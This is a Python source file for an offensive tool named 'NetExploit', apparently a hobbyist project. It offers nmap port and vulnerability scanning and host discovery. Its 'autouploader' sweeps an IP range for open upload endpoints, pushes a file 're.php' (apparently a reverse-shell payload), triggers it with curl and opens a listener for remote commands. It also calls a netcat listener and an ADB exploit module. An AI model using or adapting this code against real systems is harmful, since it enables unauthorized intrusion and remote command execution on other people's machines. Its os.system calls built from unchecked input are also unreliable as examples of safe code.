#!/usr/bin/python3
import os
import sys
import time
from typing import Collection
from pexpect import ExceptionPexpect
import requests
import nmap
import json
import urllib3
import urllib
import subprocess
from cprint import *
import base64
import hashlib
import socket
from lxml import etree
from art import *
from termcolor import colored
sys.path.append('__init__')
import file_creator as file
import get_ip as ad
import debug_exp as adb_sf
SEC_PATH = "/usr/bin/"
nm = nmap.PortScanner()

def listen(port):
    try:
        a = 1
        while a == 1:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('', port))
            s.listen(10)
            print(colored("[+] Listening on port %s" % port, "green"))
            conn, addr = s.accept()

            print(colored("[+] Connection from %s" % addr[0], "green"))
            while True:
                data = conn.recv(2048)
                
                
                print(colored("[+] Received: %s" % data.decode(), "green"))
                    
                com = input(colored("[*] Command: ", "blue"))
                if com == "exit":
                    s.close()
                conn.send(com.encode())
                print(colored("\n[+] Command sent\n", "green"))
                if com == "exit":
                    a = 0
                    break

  
    except Exception as e:
        print(colored("[-] An error has occured\n\n", e, "returning to main menu....", "red"))
        time.sleep(1)
        main()

def download_file(url, filename):
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True)
    with open(filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush()
    return filename

def get_file_size(filename):
    return os.stat(filename).st_size

def get_file_md5(filename):
    import hashlib
    hash_md5 = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def upload_file(url, filename):
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    return r.text

def get_file_list(url):
    r = requests.get(url)
    return r.text

def banner():
    print(colored(text2art("NetExploit"), "red"))
    cprint.info("[+] Author: Guidenevada")


def scan_network(ip_range):
    ip_list = []
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            socket.inet_aton(ip)
            ip_list.append(ip)
        except socket.error:
            pass
    return ip_list

def uploader():
    
    urllib3.disable_warnings()
    
    target_ip_range = input(colored("[+] Enter target IP range: ", "blue"))
    
    ip_list = scan_network(target_ip_range)
   
    speed = input(colored("[*] The slow scan will take around 13 minutes and the fast one will take about 3 minutes\n[*] Speed (fast/slow): ", "blue"))

    if speed == "fast":
        timeo = 0.5
    elif speed == "slow":
        timeo = 3
    else:
        print("[-] Invalid speed")
        main()
    for ip in ip_list:
        try:
            url = "http://" + ip + ":8080/upload"

                
            print(colored("[*] Testing %s" % url, "blue"))
            r = requests.get(url, timeout=timeo)
            if r.status_code == 200:
                path_dir ="report/" + ip
                file.create_dir(path_dir)
                print(colored("[+] %s is vulnerable" % url, "green"))
                filename = "re.php"
                print(colored("[+] File size: %s" % get_file_size(filename), "green"))
                print(colored("[+] File md5: %s" % get_file_md5(filename), "green"))
                upload_file(url, filename)
                print(colored("[+] File %s uploaded" % filename, "green"))
                port = int(4443)
                print(colored("[+] Listening on port %s" % port, "green"))
                os.system("gnome-terminal --bash -c 'curl "+ url+"/re.php'")
                listener = input(colored("[*] Do you want to start a listener? (in test) [y/n]: ", "blue"))
                if (listener == "y") or (listener == "Y"):
                    try:
                        listen(port)
                    except KeyboardInterrupt:
                        print(colored("\n[-] Listening stoped...","red"))
                        pass
                else:
                    pass
                
        except Exception as e:
            print(colored("[-] Error occured: see down\n\n", e, "red"))
            pass
        
        except KeyboardInterrupt:
            print(colored("[-] User Interrupt", "red"))
            exit(1)
        except:
            print(colored("[-] Unknown error", 'red'))


def scanner():
    url = input(colored("[*] Enter target URL: ", "blue"))
    ip = ad.get(url)
    path_dir =str("report/" + ip)

    if ip == "error":
        print(colored("[-] Invalid URL or host DOWN", "red"))
        main()
    file.create_dir(path_dir)

    print(colored("[+] Target IP: %s" % ip, "green"))
    print(colored("[+] Target URL: %s" % url, "green"))
    print(colored("[*] Scanning ports of %s" % url, "blue"))
    
    for port in [21, 22, 23, 25, 53, 55, 80, 110, 111, 139, 443, 444, 445, 3306, 5555, 6667, 8080, 8443, 9080, 9090, 9999, 10000, 10001]:
        
        nm.scan(ip, str(port), arguments=" -sC -sV ")
        if nm[ip]['tcp'][port]['state'] == "open":
            print(colored("[+] % i is open" % port, "green"))
    print(colored("[+] Port scanning finished", "green"))
    print(colored("[*] Scanning for vulnerabilities %s" % url, "blue"))
    result = nm.scan(hosts=str(ip), arguments='-A   --script=vuln')
    
    xml = nm.get_nmap_last_output()
    resultcsv = nm.csv()
    #printable = nm.scan('nmap -sV -oX ' + path_dir + '/nmap.xml  --script vuln,safe  ' + ip)
    resultb64 = base64.b64encode(str(result).encode('utf-8'))
    resultb64 = str(resultb64)
    resultb64 = resultb64.replace('b\'', '')
    resultb64 = resultb64.replace("'", '')
    print(colored("[+] Scan completed", "green"))
    clear = json.dumps(result)
    #print(resultb64)
    resjson = str(path_dir + "/nmap.json")
    rescsv = str(path_dir + "/nmap.csv")
    resxml = str(path_dir + "/nmap.xml")
    #open(resjson, 'w').write(result)

    print(colored("[+] scan results :\n " + ip + "\n" ,"green"))
    print('----------------------------------------------------')
#    print(colored(nm[ip].state(), "green"))
#    print(colored(nm[ip].hostname(), "green"))
#    print(colored(nm[ip].all_tcp(), "green"))
#    print(colored(nm[ip].all_udp(), "green"))
#    print(colored(nm[ip].all_protocols(), "green"))
#
#
#    print(colored(nm[ip].all_sctp(), "green"))
#    print(colored(nm.all_hosts(), "green"))
#    print(colored(nm.all_hosts().keys(), "green"))
#    print(colored(nm.all_hosts().values(), "green"))
#    print(colored(nm.all_hosts().items(), "green"))

    print(colored("[+] %s is up" % ip, "green"))
    print(colored("[+] Hostname: %s" % nm[ip].hostname(), "green"))

    
    #print(nm.scaninfo())
    for proto in nm[ip].all_protocols():
        lport = nm[ip][proto].keys()

        for port in lport:
            print(colored('[+] port : %s\tstate : %s' % (port, nm[ip][proto][port]['state']),"green"))
        print(colored("[+] Protocol: %s" % proto, "green"))
        #print(colored("[+] %s" % nm[ip][proto].keys(), "green"))
        #print(colored("[+] %s" % nm[ip][proto].values(), "green"))
        #print(colored("[+] %s" % nm[ip][proto].items(), "green"))
        #print(colored("[+] vuln: %s" % nm[ip][proto].vulns(), "green"))
    #print(nm.scanstats())
    #print(nm.command_line())
    #print(nm.all_hosts())
  

    print('----------------------------------------------------')
     
    
    
    
    try:
        open(rescsv , 'w').write(resultcsv)
        
        open(resxml , 'w').write(nm.get_nmap_last_output().decode())    
        print(colored("[+] Nmap scan saved in %s" % path_dir, "green"))
    #print(open(path_dir + '/nmap.csv').read())
    except Exception as e:
        print(colored("[-] Something went wrong\nThe integrity of the report cannot be guaranted", "red"))
        print(colored("[+] Printing the scan results", "green"))
        #doc = etree.parse(xml)
        #print(doc.findtext('script'))
        print(colored("[*] Trying to save the scan results in %s" % path_dir, "blue"))
        try:
            open(rescsv , 'w').write(resultcsv)
            #open(resxml , 'w').write(doc)
            print(colored("[+] Nmap scan saved in %s" % path_dir, "green"))
        except Exception as e:
            print(colored("[-] Something went wrong\nThe integrity of the report cannot be guaranted", "red"))
                
    main()   

def netdiscover():
    print(colored("[!] Netdiscover is in alpha version.", "yellow"))
    print(colored("[!] Please, report bugs to issue section.", "yellow"))
    ip_range = input(colored("[*] Enter IP range: ", "blue"))
    det = input(colored("[*] Do you want some details: [yes/no]\n: ", "blue"))
    print("\n\n")
    os.system("echo '' > report/hosts.txt")
    for i in range (1, 255):
        try:
            ip = ip_range  + str(i)
            nm.scan(hosts=ip, arguments=" -sP -sC")
            if nm[ip].hostname() != "":
                print(colored("[+] %s is up" % ip, "green"))
                print(colored("[+] Hostname: %s" % nm[ip].hostname(), "green"))
             
                print("\n")
                
                os.system("echo '" + ip + ": " + nm[ip].hostname() + "' >> report/" + "hosts.txt")
            
        except KeyboardInterrupt as e:
            print(colored("[-] User Interrupt", "red"))
            main()
        except Exception as e:
            if det == "yes":
                print(colored("[-] %s is down" % ip, "red"))
            if det == "no":
                pass
            pass
            #print(colored("[-] Error occured: see down\n\n" , "red"))
            #print(e)            
    
def main():
    try:
        #print(colored("[+] NetExploit", "red"))
        #print(colored("[+] Author: Guidenevada", "green"))
        choice = int(input(colored("\n1 -webscan\n2 -autouploader\n3 -netdiscover(alpha version)\n4- listeber\n5- android debug bridge exploit\n10- HELP\n99- EXIT\n[*] Choose an option: ", "blue")))
        if choice == 1:

            scanner()
        if choice == 2:
            uploader()
        if choice == 3:
            netdiscover()
        if choice == 4:
            port = input(colored("[*] Enter the port to listen: ", "blue"))
            port = int(port)
            print(colored("[+] Listening on port %s \n\n" % port, "green"))
            os.system("nc -lp " + str(port))
            #listen(port)
        if choice == 5:
            print(colored("[!] Android Debug Bridge is in alpha version.", "orange"))
            print(colored("[!] Please, report bugs to issue section.", "orange"))
            print(colored("[!] This tool is not fully functional.", "orange"))
            print(colored("[*] Enter the IP of the target: ", "blue"))
            ip = input()
            print(colored("[*] Enter the port of the target[5555]: ", "blue"))
            port = input()
            if port == "":
                port = 5555
            else:
                port = int(port)
            adb_sf.andro(ip, port)
        if choice == 10:
            print("Under construction")
            main()
        if choice == 79:
            banner()
        if choice == 99:
            print(colored("[!] Exiting...", "red"))
            exit()
        else:
            print(colored("[-] Invalid option", "red"))
            main()
    except ValueError:
        print(colored("[-] Invalid option", "red"))
        main()
if __name__ == "__main__":
    try:
        banner()
        main()
    except KeyboardInterrupt as e:
        print(colored("[-] User Interrupt", "red"))
        main()
